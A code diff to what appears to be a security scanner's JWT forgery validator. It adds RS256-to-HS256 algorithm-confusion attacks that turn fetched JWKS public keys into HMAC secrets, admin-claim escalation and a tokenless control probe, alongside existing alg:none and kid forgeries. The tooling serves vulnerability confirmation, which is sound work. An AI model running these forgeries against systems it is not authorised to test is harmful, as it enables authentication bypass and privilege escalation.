@@ -44,7 +44,8 @@ _JWT_RE = re.compile(r"\b(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]
 # is a privilege escalation, not just a re-sign of the same identity.
 _ROLE_CLAIMS = {"role": "admin", "roles": ["admin"], "is_admin": True, "admin": True,
                 "isadmin": True, "user_role": "admin", "scope": "admin", "authz": "admin",
-                "privilege": "admin", "group": "admin"}
+                "privilege": "admin", "group": "admin", "sub": "administrator",
+                "username": "administrator", "user": "administrator"}
 
 
 def _b64url_decode(s: str) -> bytes:
@@ -83,6 +84,12 @@ def _escalate(payload: dict) -> dict:
     for claim, elevated in _ROLE_CLAIMS.items():
         if claim in p:
             p[claim] = elevated
+    # A forgery probe must never silently replay the original valid token.  Some
+    # JWTs carry none of the common identity/role claim names above; add a benign
+    # synthetic claim so the signed bytes still change and signature reuse is a
+    # real negative control rather than a false confirmation.
+    if p == payload:
+        p["harness_probe"] = "signature-must-change"
     return p
 
 
@@ -104,6 +111,37 @@ def _hs256(header: dict, payload: dict, key: bytes) -> str:
     p = _b64url_encode(json.dumps(_escalate(payload), separators=(",", ":")).encode())
     sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
     return f"{h}.{p}.{_b64url_encode(sig)}"
+
+
+def _rsa_jwks_to_pem(body: str, kid: str | None = None) -> list[tuple[str, bytes]]:
+    """Convert public RSA JWKs to the PEM bytes vulnerable verifiers misuse as HMAC keys."""
+    try:
+        document = json.loads(body or "")
+    except (TypeError, ValueError, json.JSONDecodeError):
+        return []
+    keys = document.get("keys", []) if isinstance(document, dict) else []
+    out: list[tuple[str, bytes]] = []
+    try:
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+    except ImportError:
+        return []
+    for item in keys:
+        if not isinstance(item, dict) or item.get("kty") != "RSA":
+            continue
+        item_kid = str(item.get("kid") or "")
+        if kid and item_kid and item_kid != kid:
+            continue
+        try:
+            n = int.from_bytes(_b64url_decode(str(item["n"])), "big")
+            e = int.from_bytes(_b64url_decode(str(item["e"])), "big")
+            pem = RSAPublicNumbers(e, n).public_key().public_bytes(
+                serialization.Encoding.PEM,
+                serialization.PublicFormat.SubjectPublicKeyInfo)
+        except (KeyError, TypeError, ValueError):
+            continue
+        out.append((item_kid, pem))
+    return out
 
 
 def _kid_forgeries(header: dict, payload: dict) -> list[tuple[str, str]]:
@@ -195,6 +233,11 @@ class JwtForgeValidator(Validator):
             h[hdr_name] = _JWT_RE.sub(tok, orig) if _JWT_RE.search(orig) else f"Bearer {tok}"
             return h
 
+        def _hdrs_no_token() -> dict:
+            # The unauthenticated baseline: drop the JWT-bearing header entirely.
+            return {k: v for k, v in (exchange.request_headers or {}).items()
+                    if k.lower() != hdr_name.lower()}
+
         # CONTROL: a garbage-signature token must be rejected, else the endpoint
         # isn't verifying anything and "forged accepted" would be meaningless.
         garbage = f"{token.rsplit('.', 1)[0]}.{_b64url_encode(b'not-a-valid-signature-xxxx')}"
@@ -202,11 +245,52 @@ class JwtForgeValidator(Validator):
         if g_status is None:
             return ValidationResult(self.name, "error", "jwt", summary="garbage-token control probe failed")
         if map_._substantive(g_status, g_body):
-            return self._skip("endpoint accepts a garbage-signature token too -- not a signature-verification "
-                              "bug (the endpoint isn't checking the token at all; an access-control leg covers that)")
+            # The endpoint accepts an INVALID-signature token. That is EITHER the
+            # unverified-signature bug (the server never checks the signature) OR a
+            # public endpoint that ignores the token. Disambiguate with a TOKENLESS
+            # control: if removing the token is DENIED while the invalid-signature
+            # token is accepted, the token DOES gate access yet its signature is not
+            # checked -- confirmed, safely (GET only, no forged privileged action).
+            n_status, n_body = await self._probe(exchange.url, _hdrs_no_token())
+            if n_status is not None and not map_._substantive(n_status, n_body):
+                return ValidationResult(
+                    self.name, "confirmed", "jwt", confidence=0.9, confirmed=True,
+                    summary="JWT signature not verified: a token with an INVALID signature was accepted "
+                            "for authenticated access that a tokenless request is denied -- the server "
+                            "does not check the signature (authentication bypass / privilege escalation).",
+                    evidence=(f"invalid-signature token returned a protected payload (HTTP {g_status}) at "
+                              f"{exchange.url}; the same request with NO token returned a non-authenticated "
+                              f"response (login page/redirect, HTTP {n_status}). Because the signature is "
+                              f"unchecked, any claim (e.g. an admin identity) can be forged."),
+                    raw_output=(g_body or "")[:600])
+            return self._skip("endpoint accepts a garbage-signature token AND a tokenless request -- it "
+                              "does not gate on the token at all (an access-control leg covers that, not a "
+                              "signature-verification bug)")
 
         forgeries = [("alg:none", _forge_alg_none(header, payload)),
                      ("payload-tamper (original signature reused)", _forge_keep_sig(header, payload, sig))]
+        # RS256 -> HS256 algorithm confusion.  Fetch only standard same-origin
+        # JWKS endpoints and treat the exposed RSA public key bytes as the HMAC
+        # secret.  A robust verifier rejects this because it pins the algorithm
+        # and key type; a confused verifier validates our attacker-signed token.
+        if str(header.get("alg") or "").upper().startswith("RS"):
+            origin = f"{urlsplit(exchange.url).scheme}://{urlsplit(exchange.url).netloc}"
+            jwks_seen: set[str] = set()
+            for path in ("/jwks.json", "/.well-known/jwks.json"):
+                key_status, key_body = await self._probe(origin + path, {})
+                if key_status is None or key_status >= 400:
+                    continue
+                for key_kid, pem in _rsa_jwks_to_pem(key_body, str(header.get("kid") or "") or None):
+                    fingerprint = hashlib.sha256(pem).hexdigest()
+                    if fingerprint in jwks_seen:
+                        continue
+                    jwks_seen.add(fingerprint)
+                    confused_header = dict(header)
+                    confused_header["alg"] = "HS256"
+                    if key_kid:
+                        confused_header["kid"] = key_kid
+                    forgeries.append(("RS256 public-key/HMAC algorithm confusion",
+                                      _hs256(confused_header, payload, pem)))
         forgeries += _kid_forgeries(header, payload)
         for label, forged in forgeries:
             f_status, f_body = await self._probe(exchange.url, _hdrs(forged))
